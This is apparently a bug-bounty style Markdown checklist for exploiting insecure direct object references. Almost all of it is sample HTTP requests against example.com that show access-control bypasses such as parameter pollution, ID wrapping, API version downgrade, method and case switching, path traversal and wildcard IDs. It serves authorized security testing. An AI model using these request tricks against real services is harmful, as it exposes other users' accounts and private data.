## IDOR checklists

**How to exploit**

- [ ]  Add parameters onto the endpoints for example, if there was

```
GET /api/v1/getuser HTTP/1.1
Host: example.com

Try this to bypass

GET /api/v1/getuser?id=1234 HTTP/1.1
Host: example.com
...

```

- [ ]  HTTP Parameter pollution

```
POST /api/get_profile HTTP/1.1
Host: example.com
...

user_id=hacker_id&user_id=victim_id

```

- [ ]  Add .json to the endpoint

```
GET /v2/GetData/1234 HTTP/1.1
Host: example.com
...

Try this to bypass

GET /v2/GetData/1234.json HTTP/1.1
Host: example.com
...

```

- [ ]  Test on outdated API Versions

| Initial Request | Bypass Request |
| --- | --- |
| POST /v1/GetData HTTP/1.1Host: example.comid=123 | POST /v2/GetData HTTP/1.1Host: example.comid=123 |
- [ ]  Wrap the ID with an array.

```
POST /api/get_profile HTTP/1.1
Host: example.com
...

{"user_id":111}

Try this to bypass

POST /api/get_profile HTTP/1.1
Host: example.com
...

{"id":[111]}

```

- [ ]  Wrap the ID with a JSON object

```
POST /api/get_profile HTTP/1.1
Host: example.com
...

{"user_id":111}

Try this to bypass

POST /api/get_profile HTTP/1.1
Host: example.com
...

{"user_id":{"user_id":111}}

```

- [ ]  JSON Parameter Pollution.

```
POST /api/get_profile HTTP/1.1
Host: example.com
...

{"user_id":"hacker_id","user_id":"victim_id"}

```

- [ ]  Try decode the ID, if the ID encoded using md5,base64,etc.

```
GET /GetUser/dmljdGltQG1haWwuY29t HTTP/1.1
Host: example.com
...

```

dmljdGltQG1haWwuY29t => [victim@mail.com](mailto:victim@mail.com)

- [ ]  If the website using GraphQL, try to find IDOR using GraphQL.

```
GET /graphql HTTP/1.1
Host: example.com
...

```

```
GET /graphql.php?query= HTTP/1.1
Host: example.com
...

```

- [ ]  MFLAC (Missing Function Level Access Control)

```
GET /admin/profile HTTP/1.1
Host: example.com

Try this to bypass

GET /ADMIN/profile HTTP/1.1
Host: example.com
...

```

- [ ]  Try to swap uuid with number

```
GET /file?id=90ri2-xozifke-29ikedaw0d HTTP/1.1
Host: example.com
...

Try this to bypass

GET /file?id=302
Host: example.com
...

```

- [ ]  Change HTTP Method

```
GET /api/v1/users/profile/111 HTTP/1.1
Host: example.com
...

Try this to bypass

POST /api/v1/users/profile/111 HTTP/1.1
Host: example.com
...

```

- [ ]  Path traversal

```
GET /api/v1/users/profile/victim_id HTTP/1.1
Host: example.com
...

Try this to bypass

GET /api/v1/users/profile/my_id/../victim_id HTTP/1.1
Host: example.com
...

```

- [ ]  Change request `Content-Type`

```
GET /api/v1/users/1 HTTP/1.1
Host: example.com
Content-type: application/xml

Try this to bypass

GET /api/v1/users/2 HTTP/1.1
Host: example.com
Content-type: application/json

```

- [ ]  Send wildcard instead of ID

``` GET /api/users/111 HTTP/1.1
Host: example.com

Try this to bypass

GET /api/users/* HTTP/1.1
Host: example.com

GET /api/users/% HTTP/1.1
Host: example.com

GET /api/users/_ HTTP/1.1
Host: example.com

GET /api/users/. HTTP/1.1
Host: example.com
```